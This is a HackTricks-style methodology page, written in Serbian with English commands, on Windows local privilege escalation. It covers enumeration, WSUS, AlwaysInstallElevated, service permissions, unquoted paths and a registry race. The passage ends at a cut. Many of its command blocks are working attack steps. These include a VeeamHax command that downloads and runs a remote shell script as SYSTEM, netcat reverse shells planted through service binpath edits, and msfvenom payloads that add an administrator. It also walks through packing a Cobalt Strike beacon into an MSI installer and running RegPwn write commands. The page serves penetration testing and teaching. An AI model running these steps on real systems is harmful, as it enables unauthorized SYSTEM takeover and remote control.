# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Najbolji alat za traženje Windows local privilege escalation vektora:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Početna Windows teorija

### Access Tokens

**Ako ne znaš šta su Windows Access Tokens, pročitaj sledeću stranicu pre nego što nastaviš:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Pogledaj sledeću stranicu za više informacija o ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ako ne znaš šta su integrity levels u Windowsu, trebalo bi da pročitaš sledeću stranicu pre nego što nastaviš:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Postoje različite stvari u Windowsu koje bi mogle **da spreče enumeraciju sistema**, pokretanje executables ili čak **otkriju tvoje aktivnosti**. Trebalo bi da **pročitaš** sledeću **stranicu** i **enumerate** sve ove **defense** **mechanisms** pre nego što počneš sa enumeracijom za privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess processes pokrenuti kroz `RAiLaunchAdminProcess` mogu biti zloupotrebljeni da se dođe do High IL bez promptova kada se zaobiđu AppInfo secure-path provere. Proveri ovde namenski UIAccess/Admin Protection bypass workflow:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation može biti zloupotrebljen za arbitrary SYSTEM registry write (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Nedavne Windows verzije su takođe uvele **SMB arbitrary-port** LPE putanju gde se privilegovana lokalna NTLM autentikacija reflektuje preko ponovo iskorišćene SMB TCP konekcije:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Proveri da li Windows verzija ima neku poznatu ranjivost (proveri i primenjene zakrpe).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploits za verzije

Ovaj [site](https://msrc.microsoft.com/update-guide/vulnerability) je koristan za pretragu detaljnih informacija o Microsoft sigurnosnim ranjivostima. Ova baza podataka ima više od 4,700 sigurnosnih ranjivosti, što pokazuje **ogromnu attack surface** koju Windows environment predstavlja.

**Na sistemu**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Lokalno sa sistemskim informacijama**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repozitorijumi exploit-a:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Da li su neki credential/Juicy info sačuvani u env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell History
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

Možete naučiti kako da ovo uključite u [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Detalji izvršavanja PowerShell pipeline-a se beleže, obuhvatajući izvršene komande, pozive komandi i delove skripti. Međutim, potpuni detalji izvršavanja i rezultati izlaza možda neće biti uhvaćeni.

Da biste ovo omogućili, pratite uputstva u delu "Transcript files" dokumentacije, i umesto **"Powershell Transcription"** izaberite **"Module Logging"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Da biste videli poslednjih 15 događaja iz PowerShell logova, možete izvršiti:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Potpuni zapis aktivnosti i celokupnog sadržaja izvršavanja skripta se hvata, obezbeđujući da je svaki blok koda dokumentovan dok se izvršava. Ovaj proces čuva sveobuhvatni audit trag svake aktivnosti, što je vredno za forenziku i analizu zlonamernog ponašanja. Dokumentovanjem svih aktivnosti u trenutku izvršavanja, pružaju se detaljni uvidi u proces.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Događaji logovanja za Script Block mogu se pronaći u okviru Windows Event Viewer-a na putanji: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Da biste videli poslednjih 20 događaja, možete koristiti:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet Settings
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Diskovi
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Možete kompromitovati sistem ako se ažuriranja ne traže koristeći http**S** već http.

Počinjete tako što proveravate da li mreža koristi non-SSL WSUS update tako što pokrećete sledeće u cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ili sledeće u PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Ako dobijete odgovor kao jedan od ovih:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
I ako je `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ili `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jednako `1`.

Tada, **to je exploitable.** Ako je poslednji registry jednak 0, onda će WSUS unos biti ignorisan.

Kako biste exploitovali ove vulnerabilities, možete koristiti alate kao što su: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Ovo su MiTM weaponized exploits scripts za injectovanje 'fake' updates u non-SSL WSUS traffic.

Pročitajte istraživanje ovde:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Pročitajte kompletan report ovde**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
U osnovi, ovo je flaw koji ovaj bug exploit-uje:

> Ako imamo moć da modifikujemo naš lokalni user proxy, a Windows Updates koristi proxy konfigurisan u Internet Explorer's settings, tada imamo moć da lokalno pokrenemo [PyWSUS](https://github.com/GoSecure/pywsus) da presretnemo naš sopstveni traffic i pokrenemo code kao elevated user na našem assetu.
>
> Furthermore, pošto WSUS service koristi settings trenutnog usera, koristiće i svoj certificate store. Ako generišemo self-signed certificate za WSUS hostname i dodamo ovaj certificate u certificate store trenutnog usera, bićemo u mogućnosti da presretnemo i HTTP i HTTPS WSUS traffic. WSUS ne koristi HSTS-like mehanizme da implementira trust-on-first-use tip validation na certificate. Ako je certificate koji je prikazan trusted od strane usera i ima tačan hostname, service će ga prihvatiti.

Možete exploitovati ovu vulnerability koristeći alat [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (jednom kada bude liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Mnogi enterprise agents izlažu localhost IPC surface i privileged update channel. Ako enrollment može da se coerces na attacker server i updater trustuje rogue root CA ili slabe signer provere, lokalni user može da isporuči malicious MSI koji SYSTEM service instalira. Pogledajte generalizovanu tehniku (baziranu na Netskope stAgentSvc chain – CVE-2025-0309) ovde:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` izlaže localhost service na **TCP/9401** koji obrađuje attacker-controlled poruke, omogućavajući arbitrary commands kao **NT AUTHORITY\SYSTEM**.

- **Recon**: potvrdite listener i verziju, npr. `netstat -ano | findstr 9401` i `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: postavite PoC kao što je `VeeamHax.exe` sa potrebnim Veeam DLL-ovima u istom direktorijumu, zatim okinite SYSTEM payload preko lokalnog socket-a:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Usluga izvršava komandu kao SYSTEM.
## KrbRelayUp

Postoji ranjivost za **lokalnu privilege escalation** u Windows **domain** okruženjima pod određenim uslovima. Ti uslovi uključuju okruženja u kojima **LDAP signing is not enforced,** korisnici imaju self-rights koji im omogućavaju da podešavaju **Resource-Based Constrained Delegation (RBCD),** i mogućnost da korisnici kreiraju računare unutar domena. Važno je napomenuti da su ovi **requirements** ispunjeni uz **default settings**.

Nađite **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Za više informacija o toku napada pogledajte [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Ako** su ova 2 registra **enabled** (vrednost je **0x1**), onda korisnici bilo kog privilege mogu da **install** (execute) `*.msi` fajlove kao NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Koristite komandu `Write-UserAddMSI` iz power-up da biste u trenutnom direktorijumu kreirali Windows MSI binar za eskalaciju privilegija. Ovaj skript upisuje unapred kompajlirani MSI installer koji traži dodavanje korisnika/grupe (tako da će vam biti potreban GIU pristup):
```
Write-UserAddMSI
```
Samo izvršite kreirani binary da biste eskalirali privilegije.

### MSI Wrapper

Pročitajte ovaj tutorial da biste naučili kako da napravite MSI wrapper koristeći ovaj alat. Imajte na umu da možete wrapovati "**.bat**" fajl ako **samo** želite da **izvršite** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** sa Cobalt Strike ili Metasploit novi Windows EXE TCP payload u `C:\privesc\beacon.exe`
- Otvorite **Visual Studio**, izaberite **Create a new project** i ukucajte "installer" u polje za pretragu. Izaberite **Setup Wizard** project i kliknite **Next**.
- Dajte projektu ime, kao **AlwaysPrivesc**, koristite **`C:\privesc`** za lokaciju, izaberite **place solution and project in the same directory**, i kliknite **Create**.
- Nastavite da klikćete **Next** dok ne stignete do koraka 3 od 4 (choose files to include). Kliknite **Add** i izaberite Beacon payload koji ste upravo generisali. Zatim kliknite **Finish**.
- Označite projekat **AlwaysPrivesc** u **Solution Explorer** i u **Properties**, promenite **TargetPlatform** sa **x86** na **x64**.
- Postoje i druga podešavanja koja možete promeniti, kao što su **Author** i **Manufacturer**, što može učiniti da instalirana aplikacija izgleda legitimnije.
- Desni klik na projekat i izaberite **View > Custom Actions**.
- Desni klik na **Install** i izaberite **Add Custom Action**.
- Dvaput kliknite na **Application Folder**, izaberite svoj fajl **beacon.exe** i kliknite **OK**. Ovo će obezbediti da se beacon payload izvrši čim se installer pokrene.
- U okviru **Custom Action Properties**, promenite **Run64Bit** na **True**.
- Na kraju, **build it**.
- Ako se pojavi upozorenje `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, proverite da li ste postavili platformu na x64.

### MSI Installation

Da biste izvršili **installation** zlonamernog `.msi` fajla u **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Da biste iskoristili ovu ranjivost, možete koristiti: _exploit/windows/local/always_install_elevated_

## Antivirus i Detektori

### Audit Settings

Ove postavke odlučuju šta se **beleži**, tako da treba da obratite pažnju
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding je zanimljivo znati gde se logovi šalju
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** je dizajniran za **upravljanje lozinkama lokalnog Administratora**, obezbeđujući da svaka lozinka bude **jedinstvena, nasumična i redovno ažurirana** na računarima pridruženim domenu. Ove lozinke se bezbedno čuvaju u okviru Active Directory i mogu im pristupiti samo korisnici kojima su dodeljene dovoljne dozvole kroz ACLs, što im omogućava da vide lozinke lokalnog admina ako su autorizovani.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ako je aktivan, **plain-text lozinke se čuvaju u LSASS** (Local Security Authority Subsystem Service).\
[**Više informacija o WDigest-u na ovoj stranici**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Počevši od **Windows 8.1**, Microsoft je uveo pojačanu zaštitu za Local Security Authority (LSA) kako bi **blokirao** pokušaje nepoverljivih procesa da **čitaju njegovu memoriju** ili ubacuju kod, dodatno obezbeđujući sistem.\
[**Više informacija o LSA Protection ovde**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credential Guard

**Credential Guard** uveden je u **Windows 10**. Njegova svrha je da zaštiti kredencijale sačuvane na uređaju od pretnji kao što su pass-the-hash napadi.| [**Više informacija o Credentials Guard ovde.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Keširani kredencijali

**Domenски kredencijali** se autentifikuju pomoću **Local Security Authority** (LSA) i koriste ih komponente operativnog sistema. Kada se podaci za prijavu korisnika autentifikuju putem registrovanog security package-a, domenски kredencijali za korisnika se tipično uspostavljaju.\
[**Više informacija o Cached Credentials ovde**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Korisnici & grupe

### Enumeriši korisnike & grupe

Treba da proveriš da li neka od grupa kojima pripadaš ima interesantne permisije
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

Ako **pripadaš nekoj privilegovanoj grupi, možda ćeš moći da eskaliraš privilegije**. Saznaj više o privilegovanim grupama i kako da ih zloupotrebiš za eskalaciju privilegija ovde:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Saznaj više** o tome šta je **token** na ovoj stranici: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Proveri sledeću stranicu da bi **saznao više o zanimljivim tokenima** i kako da ih zloupotrebiš:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### Home folders
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Politika lozinki
```bash
net accounts
```
### Preuzimanje sadržaja clipboard-a
```bash
powershell -command "Get-Clipboard"
```
## Pokrenuti procesi

### Dozvole za fajlove i foldere

Pre svega, pri listanju procesa **proveri da li postoje lozinke unutar komandne linije procesa**.\
Proveri da li možeš **da prepišeš neki pokrenuti binarni fajl** ili da li imaš write dozvole nad folderom binarnog fajla kako bi iskoristio moguće [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Uvek proveri da li postoje [**electron/cef/chromium debuggers**] koji su pokrenuti, možeš ih zloupotrebiti da eskaliraš privilegije](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Provera dozvola binarnih fajlova procesa**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Provera dozvola za foldere binarnih fajlova procesa (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Rudarenje lozinki iz memorije

Možete napraviti memory dump procesa koji se izvršava pomoću **procdump** iz sysinternals. Servisi poput FTP imaju **credentiale u čistom tekstu u memoriji**, pokušajte da izbacite memoriju i pročitate credentiale.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Nesigurne GUI aplikacije

**Aplikacije koje rade kao SYSTEM mogu korisniku da omoguće pokretanje CMD-a, ili pregledanje direktorijuma.**

Primer: "Windows Help and Support" (Windows + F1), pretražite "command prompt", kliknite na "Click to open Command Prompt"

## Servisi

Service Triggers omogućavaju Windows-u da pokrene servis kada se ispune određeni uslovi (aktivnost named pipe/RPC endpoint, ETW događaji, dostupnost IP adrese, dolazak uređaja, GPO osvežavanje, itd.). Čak i bez SERVICE_START prava često možete pokrenuti privilegovane servise tako što ćete okinuti njihove triggere. Pogledajte tehnike enumeracije i aktivacije ovde:

-
{{#ref}}
service-triggers.md
{{#endref}}

Dobijte listu servisa:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Dozvole

Možete koristiti **sc** da dobijete informacije o servisu
```bash
sc qc <service_name>
```
Preporučuje se da imate binarni fajl **accesschk** iz _Sysinternals_ da biste proverili potreban nivo privilegija za svaki servis.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Preporučuje se da proverite da li "Authenticated Users" mogu da menjaju bilo koju uslugu:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Možete preuzeti accesschk.exe za XP ovde](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Omogući servis

Ako imate ovu grešku (na primer sa SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Možete ga omogućiti koristeći
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Uzmite u obzir da servis upnphost zavisi od SSDPSRV da bi radio (za XP SP1)**

**Još jedno zaobilaženje** ovog problema je pokretanje:
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

U scenariju kada grupa "Authenticated users" poseduje **SERVICE_ALL_ACCESS** nad servisom, moguće je modifikovati izvršni binarni fajl servisa. Da biste modifikovali i izvršili **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Ponovo pokreni service
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privilegije mogu biti eskalirane kroz različite dozvole:

- **SERVICE_CHANGE_CONFIG**: Dozvoljava rekonfiguraciju binarne datoteke servisa.
- **WRITE_DAC**: Omogućava rekonfiguraciju dozvola, što vodi do mogućnosti menjanja konfiguracije servisa.
- **WRITE_OWNER**: Dozvoljava preuzimanje vlasništva i rekonfiguraciju dozvola.
- **GENERIC_WRITE**: Nasleđuje mogućnost menjanja konfiguracije servisa.
- **GENERIC_ALL**: Takođe nasleđuje mogućnost menjanja konfiguracije servisa.

Za detekciju i eksploataciju ove ranjivosti, može se koristiti _exploit/windows/local/service_permissions_.

### Slabe dozvole za binarne datoteke servisa

**Proverite da li možete da izmenite binarnu datoteku koju izvršava servis** ili da li imate **write permissions na folder** u kome se binarna datoteka nalazi ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Možete dobiti svaku binarnu datoteku koju izvršava servis pomoću **wmic** (ne u system32) i proveriti svoje dozvole pomoću **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Takođe možete koristiti **sc** i **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Dozvole za izmenu registra servisa

You should check if you can modify any service registry.\
Možete **proveriti** svoje **dozvole** nad registrom servisa radeći:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Treba proveriti da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju `FullControl` dozvole. Ako imaju, binarni fajl koji servis izvršava može biti izmenjen.

Da biste promenili Path binarnog fajla koji se izvršava:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Neke Windows Accessibility funkcije kreiraju per-user **ATConfig** ključeve koji se kasnije kopiraju od strane **SYSTEM** procesa u HKLM session key. Registry **symbolic link race** može da preusmeri taj privilegovani upis u **bilo koji HKLM path**, dajući arbitrary HKLM **value write** primitive.

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lists installed accessibility features.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stores user-controlled configuration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` is created during logon/secure-desktop transitions and is writable by the user.

Abuse flow (CVE-2026-24291 / ATConfig):

1. Populate the **HKCU ATConfig** value you want to be written by SYSTEM.
2. Trigger the secure-desktop copy (e.g., **LockWorkstation**), which starts the AT broker flow.
3. **Win the race** by placing an **oplock** on `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; when the oplock fires, replace the **HKLM Session ATConfig** key with a **registry link** to a protected HKLM target.
4. SYSTEM writes the attacker-chosen value to the redirected HKLM path.

Once you have arbitrary HKLM value write, pivot to LPE by overwriting service configuration values:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Pick a service that a normal user can start (e.g., **`msiserver`**) and trigger it after the write. **Note:** the public exploit implementation **locks the workstation** as part of the race.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

Ako imate ovo dopuštenje nad registry-em to znači da **možete kreirati podregistry-je iz ovog**. U slučaju Windows services ovo je **dovoljno za izvršavanje proizvoljnog koda:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ako putanja do izvršne datoteke nije unutar navodnika, Windows će pokušati da izvrši svaku završnicu pre razmaka.

Na primer, za putanju _C:\Program Files\Some Folder\Service.exe_ Windows će pokušati da izvrši:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Navedi sve unquoted service paths, isključujući one koji pripadaju ugrađenim Windows servisima:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Možete detektovati i iskoristiti** ovu ranjivost pomoću metasploit: `exploit/windows/local/trusted\_service\_path` Možete ručno kreirati binary za servis pomoću metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Akcije oporavka

